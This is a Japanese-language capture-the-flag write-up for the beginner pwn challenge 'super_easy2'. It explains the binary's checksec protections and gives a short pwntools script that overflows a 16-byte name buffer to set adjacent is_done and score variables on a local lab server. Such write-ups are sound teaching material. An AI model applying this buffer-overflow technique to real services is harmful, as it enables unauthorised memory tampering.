## 事前知識
詳しくはsuper_easyのwriteupをご覧ください。

```bash
$ checksec super_easy2
[*] '/home/user/work/taskctf21/pwn/super_easy/dist/super_easy2'
    Arch:     amd64-64-little   <- Architecture は amd64-64-little
    RELRO:    Full RELRO        <- RELocation REadOnly の略で、GOT Overwrite という攻撃ができない設定
    Stack:    Canary found      <- スタック上での Buffer Overflow を防ぐための機構が有効である設定
    NX:       NX enabled        <- 実行する必要のないデータを実行できなくする No eXecute bit という機構が有効である設定
    PIE:      PIE enabled       <- Position Independent Executable の略で、既知のアドレスが存在しない設定
```

## 方針
- `is_done`を0以外にする
- `score`を`0x1337`にする
  - little endianであることに注意

## 解法
サーバの起動

```bash
docker-compose up -d
```

```python
from pwn import *

ADDR = '127.0.0.1'
PORT = 30003

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16 # name用の部分を全部埋める
payload += b'\x01\x00\x00\x00' # is_doneに1を入れる
payload += b'\x37\x13\x00\x00' # scoreに1337を入れる

io.sendline(payload)
io.interactive()
```

## コメント
bofで書き込みをするやつです。nameが16bytesあり、is_doneで4bytesあるので、21bytes目から0x1337を書き込めば良いです。
